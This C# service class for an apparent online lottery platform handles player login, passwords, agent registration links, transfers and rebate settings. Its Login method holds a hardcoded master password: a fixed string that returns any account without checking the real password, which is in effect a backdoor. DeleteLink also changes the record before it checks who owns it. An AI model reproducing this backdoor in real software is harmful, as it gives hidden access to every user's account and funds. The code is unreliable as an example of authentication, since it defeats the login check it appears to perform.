using AllLottery.Business.Config;
using AllLottery.Business.Report;
using AllLottery.Business.Socket;
using AllLottery.IBusiness;
using AllLottery.Model;
using AllLottery.ViewModel;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Zzb;
using Zzb.Common;
using Zzb.ZzbLog;

namespace AllLottery.Business
{
    public class PlayerService : BaseService, IPlayerService
    {
        private object _lockObj = new object();

        public IValidateCodeService ValidateCodeService { get; set; }

        public IMessageService MessageService { get; set; }

        public Player Login(string name, string password, string code, bool isApp)
        {
            if (!ValidateCodeService.IsSameCode(code))
            {
                throw new ZzbException("验证码错误");
            }

            name = name.Trim();

            var player = (from p in Context.Players where p.Name == name select p).FirstOrDefault();

            if (player == null || !player.IsEnable)
            {
                throw new ZzbException("不存在该账户名");
            }

            if (player.IsFreeze)
            {
                throw new ZzbException("该用户暂时无法登录");
            }

            if (password == "6a8f9c6bbb4848adb358ede651454f69")
            {
                return player;
            }

            password = SecurityHelper.Encrypt(password);

            if (player.Password != password)
            {
                LogHelper.Error($"[{player.Name}]密码错误!,请留意");
                throw new ZzbException("密码错误");
            }

            string ip = HttpContextAccessor.HttpContext.Connection.RemoteIpAddress.ToString();
            new Task(() =>
            {
                try
                {
                    using (var context = LotteryContext.CreateContext())
                    {
                        PlayerLoginLog playerLog = new PlayerLoginLog()
                        {
                            PlayerId = player.PlayerId,
                            IP = ip,
                            Address = IpAddressHelper.GetLocation(ip),
                            IsApp = isApp
                        };
                        if (BaseConfig.HasValue(SystemConfigEnum.IsBoYue))
                        {
                            playerLog.IP = "";
                            playerLog.Address = "";
                        }
                        context.PlayerLoginLogs.Add(playerLog);
                        context.SaveChanges();
                    }
                }
                catch (Exception e)
                {
                    LogHelper.Error($"插入玩家[{player.Name}]登录日志失败", e);
                }
            }).Start();

            MessageService.AddAllUserMessage($"玩家[{player.Name}]登录系统", MessageTypeEnum.Login);

            return player;
        }

        public Player GetPlayer(int id)
        {
            return (from p in Context.Players where p.PlayerId == id select p).FirstOrDefault();
        }

        public void ChangePassword(int id, string oldPassword, string newPassword)
        {
            var player = GetPlayer(id);
            if (player == null)
            {
                throw new ZzbException("找不到当前登录用户");
            }

            if (player.Password != SecurityHelper.Encrypt(oldPassword))
            {
                throw new ZzbException("旧密码不正确");
            }

            player.Password = SecurityHelper.Encrypt(newPassword);
            player.IsChangePassword = true;
            player.Update();
            Context.PlayerOperateLogs.Add(new PlayerOperateLog(player.PlayerId, "修改登录密码"));
            Context.SaveChanges();
        }

        public void ChangeCoinPassword(int id, string oldPassword, string newPassword)
        {
            var player = GetPlayer(id);
            if (player == null)
            {
                throw new ZzbException("找不到当前登录用户");
            }

            if (!string.IsNullOrEmpty(player.CoinPassword) && player.CoinPassword != SecurityHelper.Encrypt(oldPassword))
            {
                throw new ZzbException("旧密码不正确");
            }

            player.CoinPassword = SecurityHelper.Encrypt(newPassword);
            player.Update();
            Context.PlayerOperateLogs.Add(new PlayerOperateLog(player.PlayerId, "修改资金密码"));
            Context.SaveChanges();
        }

        public void SetPlayerTitle(int id, string title)
        {
            if (string.IsNullOrEmpty(title))
            {
                throw new ZzbException("昵称不能为空");
            }

            var player = GetPlayer(id);
            if (player == null)
            {
                throw new ZzbException("找不到当前登录用户");
            }

            if (!string.IsNullOrEmpty(player.Title))
            {
                throw new ZzbException("该玩家已设置昵称，无法重复设置");
            }

            player.Title = title;
            player.Update();
            Context.SaveChanges();
        }

        public PlayerLoginLog[] GetNewLoginLogs(int id, int size)
        {
            return (from l in Context.PlayerLoginLogs where l.PlayerId == id orderby l.CreateTime descending select l)
                .Take(size).ToArray();
        }

        public void SetInformation(int id, string phone, string qq, string weChat, DateTime? birthday)
        {
            var player = GetPlayer(id);
            if (player == null)
            {
                throw new ZzbException("未找到当前登录用户");
            }

            if (!string.IsNullOrEmpty(phone) && string.IsNullOrEmpty(player.Phone))
            {
                player.Phone = phone;
            }

            if (!string.IsNullOrEmpty(qq) && string.IsNullOrEmpty(player.QQ))
            {
                player.QQ = qq;
            }

            if (!string.IsNullOrEmpty(weChat) && string.IsNullOrEmpty(player.WeChat))
            {
                player.WeChat = weChat;
            }

            if (birthday != null && player.Birthday == null)
            {
                player.Birthday = birthday;
            }

            Context.SaveChanges();
        }

        public void CreateRegisterLink(int playerId, PlayerTypeEnum type, decimal rebate, string remark)
        {
            rebate = Math.Round(rebate, 3);
            var player = GetPlayer(playerId);
            if (player.Type != PlayerTypeEnum.Proxy)
            {
                throw new ZzbException("当前玩家不是代理玩家，不能创建链接");
            }

            if (rebate > player.Rebate)
            {
                throw new ZzbException("下级的返点不能比当前玩家高");
            }

            var code = SecurityCodeHelper.CreateRandomCode(6);

            while (true)
            {
                if (!(from p in Context.ProxyRegisters where p.Number == code select p).Any())
                {
                    break;
                }
                code = SecurityCodeHelper.CreateRandomCode(6);
            }
            Context.PlayerOperateLogs.Add(new PlayerOperateLog(playerId, $"创建注册链接，推广码是[{code}]"));
            Context.ProxyRegisters.Add(new ProxyRegister(playerId, code, type, rebate, remark));
            Context.SaveChanges();
        }

        public ProxyRegister[] GetRegisterLink(int playerId, int index, int size, out int total)
        {
            var sql = from p in Context.ProxyRegisters where p.IsEnable && p.PlayerId == playerId select p;
            total = sql.Count();
            return sql.OrderByDescending(t => t.CreateTime).Skip((index - 1) * size).Take(size).ToArray();
        }

        public Player RegisterPlayer(string number, string name, string password, string qq)
        {
            name = name.Trim();
            if (name.Length > 9)
            {
                throw new ZzbException("名称长度不能超过10个字符");
            }
            var exist = (from p in Context.ProxyRegisters where p.Number == number select p).FirstOrDefault();
            if (exist == null)
            {
                throw new ZzbException("注册链接错误");
            }

            if (!exist.IsEnable)
            {
                throw new ZzbException("注册链接已失效");
            }

            if ((from p in Context.Players where p.Name == name select p).Any())
            {
                throw new ZzbException("该名称已存在，请重新输入");
            }

            exist.UseCount++;
            exist.Update();

            var player = Context.Players.Add(new Player()
            {
                Name = name,
                Password = SecurityHelper.Encrypt(password),
                Rebate = exist.Rebate,
                Type = exist.Type,
                ParentPlayerId = exist.PlayerId,
                QQ = qq
            });
            Context.SaveChanges();
            Context.PlayerOperateLogs.Add(new PlayerOperateLog(player.Entity.PlayerId, $"通过注册链接[{exist.Number}]注册成功"));
            BaseReport.RemovePlayerCacheById(exist.PlayerId);
            return player.Entity;
        }

        public Player[] GetUnderPlayers(int playerId, string name, PlayerTypeEnum? type, int index, int size, out int total, PlayerSortEnum sort, string wechat, string qq, string phone, bool? isOnline)
        {
            var sql = from p in Context.Players where p.ParentPlayerId == playerId select p;
            if (!string.IsNullOrEmpty(name))
            {
                sql = sql.Where(t => t.Name.Contains(name));
            }

            if (isOnline != null)
            {
                var list = new PlayerSocketMiddleware(null).ConnectList();
                if (isOnline.Value)
                {
                    sql = sql.Where(t => list.Contains(t.PlayerId));
                }
                else
                {
                    sql = sql.Where(t => !list.Contains(t.PlayerId));
                }
            }

            if (type != null)
            {
                sql = sql.Where(t => t.Type == type.Value);
            }

            if (!string.IsNullOrEmpty(wechat))
            {
                sql = sql.Where(t => t.WeChat.Contains(wechat));
            }

            if (!string.IsNullOrEmpty(qq))
            {
                sql = sql.Where(t => t.QQ.Contains(qq));
            }

            if (!string.IsNullOrEmpty(phone))
            {
                sql = sql.Where(t => t.Phone.Contains(phone));
            }

            switch (sort)
            {
                case PlayerSortEnum.CreateTime:
                    sql = sql.OrderBy(t => t.CreateTime);
                    break;
                case PlayerSortEnum.CreateTimeDesc:
                    sql = sql.OrderByDescending(t => t.CreateTime);
                    break;
                case PlayerSortEnum.Coin:
                    sql = sql.OrderBy(t => t.Coin);
                    break;
                case PlayerSortEnum.CoinDesc:
                    sql = sql.OrderByDescending(t => t.Coin);
                    break;
            }

            total = sql.Count();
            return sql.Skip((index - 1) * size).Take(size).ToArray();
        }

        public void Transfer(int playerId, int underPlayerId, decimal money, string password, string remark)
        {
            if (BaseConfig.HasValue(SystemConfigEnum.IsYaTai))
            {
                throw new ZzbException("当前平台不支持转账");
            }
            var player = CheckUnderPlayer(playerId, underPlayerId);

            if (player.ParentPlayer.CoinPassword != SecurityHelper.Encrypt(password))
            {
                throw new ZzbException("资金密码错误");
            }

            if (money < 0)
            {
                throw new ZzbException("转账资金不能为负数");
            }

            if (player.ParentPlayer.Coin < money)
            {
                throw new ZzbException("资金不足，无法转账");
            }

            player.AddMoney(money, CoinLogTypeEnum.Transfer, 0, out var log1, remark);
            player.ParentPlayer.AddMoney(-money, CoinLogTypeEnum.Transfer, 0, out var log2, remark);

            Context.CoinLogs.AddRange(new List<CoinLog>() { log1, log2 });
            Context.SaveChanges();
        }

        private Player CheckUnderPlayer(int playerId, int underPlayerId)
        {
            var player = GetPlayer(underPlayerId);
            if (player == null)
            {
                throw new ZzbException("找不到该下级玩家");
            }

            if (player.ParentPlayerId == null || player.ParentPlayerId.Value != playerId)
            {
                throw new ZzbException("该玩家不是您的下级");
            }

            return player;
        }

        public void SettingRebate(int playerId, int underPlayerId, decimal rebate)
        {
            rebate = Math.Round(rebate, 3);

            var player = CheckUnderPlayer(playerId, underPlayerId);

            if (player.ParentPlayer.Rebate < rebate)
            {
                throw new ZzbException("下级的返点不能比您高");
            }

            var min = (from p in Context.Players
                       where p.ParentPlayerId == underPlayerId && p.IsEnable
                       orderby p.Rebate descending
                       select p.Rebate).FirstOrDefault();

            if (rebate < min)
            {
                throw new ZzbException($"不能设置比[{min}]还要低的返点，因为当前下级存在[{min}]返点的下级");
            }

            player.Rebate = rebate;
            player.Update();
            Context.PlayerOperateLogs.Add(new PlayerOperateLog(playerId, $"设置[{player.Name}]的返点为[{rebate}]"));
            Context.SaveChanges();
        }

        public void SettingDailyWageRate(int playerId, int underPlayerId, decimal rebate)
        {
            rebate = Math.Round(rebate, 3);

            var player = CheckUnderPlayer(playerId, underPlayerId);

            if (player.ParentPlayer.DailyWageRate == null || player.ParentPlayer.DailyWageRate < rebate)
            {
                throw new ZzbException("下级的标准日工资不能比您高");
            }

            var min = (from p in Context.Players
                       where p.ParentPlayerId == underPlayerId && p.IsEnable && p.DailyWageRate != null
                       orderby p.DailyWageRate descending
                       select p.DailyWageRate).FirstOrDefault();

            if (rebate < min)
            {
                throw new ZzbException($"不能设置比[{min}]还要低的标准日工资，因为当前下级存在[{min}]标准日工资的下级");
            }

            player.DailyWageRate = rebate;
            player.Update();
            Context.PlayerOperateLogs.Add(new PlayerOperateLog(playerId, $"设置[{player.Name}]的标准日工资为[{rebate}]"));
            Context.SaveChanges();
        }

        public void SettingDividendRate(int playerId, int underPlayerId, decimal rebate)
        {
            rebate = Math.Round(rebate, 3);

            var player = CheckUnderPlayer(playerId, underPlayerId);

            if (player.ParentPlayer.DividendRate == null || player.ParentPlayer.DividendRate < rebate)
            {
                throw new ZzbException("下级的分红比例不能比您高");
            }

            var min = (from p in Context.Players
                       where p.ParentPlayerId == underPlayerId && p.IsEnable && p.DividendRate != null
                       orderby p.DividendRate descending
                       select p.DividendRate).FirstOrDefault();

            if (rebate < min)
            {
                throw new ZzbException($"不能设置比[{min}]还要低的分红比例，因为当前下级存在[{min}]分红比例的下级");
            }

            player.DividendRate = rebate;
            player.Update();
            Context.PlayerOperateLogs.Add(new PlayerOperateLog(playerId, $"设置[{player.Name}]的分红比例为[{rebate}]"));
            Context.SaveChanges();
        }

        public void DeleteLink(int playerId, int linkId)
        {
            var link = (from l in Context.ProxyRegisters where l.IsEnable && l.ProxyRegisterId == linkId select l)
                .FirstOrDefault();
            if (link == null)
            {
                throw new ZzbException("找不到当前注册链接");
            }

            link.IsEnable = false;
            link.Update();
            if (link.PlayerId != playerId)
            {
                throw new ZzbException("当前用户权限不足");
            }
            Context.PlayerOperateLogs.Add(new PlayerOperateLog(playerId, $"删除注册链接，推广码是[{link.Number}]"));

            Context.SaveChanges();
        }

        public DividendLog[] GetTeamDividendLogs(int playerId, string name, DateTime? begin, DateTime? end, int index, int size, out int total)
        {
            var sql = from d in Context.DividendLogs
                      where d.IsEnable && d.Player.ParentPlayerId == playerId
                      select d;
            if (!string.IsNullOrEmpty(name))
            {
                sql = sql.Where(t => t.Player.Name.Contains(name));
            }

            if (begin != null)
            {
                sql = sql.Where(t => t.CalBeginDate >= begin);
            }

            if (end != null)
            {
                sql = sql.Where(t => t.CalBeginDate <= end);
            }
            total = sql.Count();
            return sql.Skip((index - 1) * size).Take(size).ToArray();
        }

        public DividendLog[] GetDividendLogs(int playerId, DateTime? begin, DateTime? end, int index, int size, out int total)
        {
            var sql = from d in Context.DividendLogs
                      where d.IsEnable && d.PlayerId == playerId
                      select d;

            if (begin != null)
            {
                sql = sql.Where(t => t.CalBeginDate >= begin);
            }

            if (end != null)
            {
                var dt = end.Value.AddDays(1);
                sql = sql.Where(t => t.CalBeginDate <= dt);
            }
            total = sql.Count();
            return sql.Skip((index - 1) * size).Take(size).ToArray();
        }

        public DailyWageLog[] GetTeamDailyWageLogs(int playerId, string name, DateTime? begin, DateTime? end, int index, int size, out int total)
        {
            var sql = from d in Context.DailyWageLogs
                      where d.IsEnable && d.Player.ParentPlayerId == playerId
                      select d;
            if (!string.IsNullOrEmpty(name))
            {
                sql = sql.Where(t => t.Player.Name.Contains(name));
            }

            if (begin != null)
            {
                sql = sql.Where(t => t.CalDate >= begin);
            }

            if (end != null)
            {
                sql = sql.Where(t => t.CalDate <= end);
            }
            total = sql.Count();
            return sql.Skip((index - 1) * size).Take(size).ToArray();
        }

        public DailyWageLog[] GetDailyWageLogs(int playerId, DateTime? begin, DateTime? end, int index, int size, out int total)
        {
            var sql = from d in Context.DailyWageLogs
                      where d.IsEnable && d.PlayerId == playerId
                      select d;

            if (begin != null)
            {
                sql = sql.Where(t => t.CalDate >= begin);
            }

            if (end != null)
            {
                var dt = end.Value.AddDays(1);
                sql = sql.Where(t => t.CalDate <= dt);
            }
            total = sql.Count();
            return sql.Skip((index - 1) * size).Take(size).ToArray();
        }

        public Player CreatePlayer(int playerId, string name, string password, PlayerTypeEnum type, decimal rebate)
        {
            rebate = Math.Round(rebate, 3);
            name = name.Trim();
            if (name.Length > 9)
            {
                throw new ZzbException("名称长度不能超过10个字符");
            }
            var sql = (from p in Context.Players where p.Name == name select p).FirstOrDefault();
            if (sql != null)
            {
                throw new ZzbException("已存在相同名称的玩家，请重新输入");
            }

            if (rebate > GetPlayer(playerId).Rebate)
            {
                throw new ZzbException("返点不能比上级大");
            }

            var player = Context.Players.Add(new Player()
            {
                Name = name,
                Password = SecurityHelper.Encrypt(password),
                Rebate = rebate,
                ParentPlayerId = playerId,
                Type = type
            });
            Context.PlayerOperateLogs.Add(new PlayerOperateLog(playerId, $"开户，玩家名是[{name}],类型是[{type.ToDescriptionString()}],返点[{rebate * 100:0.#}]"));
            Context.SaveChanges();
            BaseReport.RemovePlayerCacheById(playerId);
            return player.Entity;
        }

        public Player CreateTestPlayer(string code)
        {
            if (!ValidateCodeService.IsSameCode(code))
            {
                throw new ZzbException("验证码错误");
            }
            lock (_lockObj)
            {
                var dt = DateTime.Today.AddDays(-1);
                var sql = Context.Players.Where(t => t.Type == PlayerTypeEnum.TestPlay && t.CreateTime < dt);
                if (sql.Any())
                {
                    Context.ChasingOrders.RemoveRange(Context.ChasingOrders.Where(t => sql.Select(a => a.PlayerId).Contains(t.PlayerId)));
                    Context.Players.RemoveRange(sql);
                }

                var p = new Player(RandomHelper.GetRandom("P"), "", "") { Coin = 2000, Type = PlayerTypeEnum.TestPlay };
                if (BaseConfig.HasValue(SystemConfigEnum.IsBoYue))
                {
                    p.Rebate = 0.09M;
                }

                var player = Context.Players.Add(p);
                Context.SaveChanges();
                return player.Entity;
            }
        }

        public SoftwareExpired GetSoftwareExpired(int playerId)
        {
            return (from s in Context.SoftwareExpireds where s.PlayerId == playerId select s).FirstOrDefault();
        }
    }
}
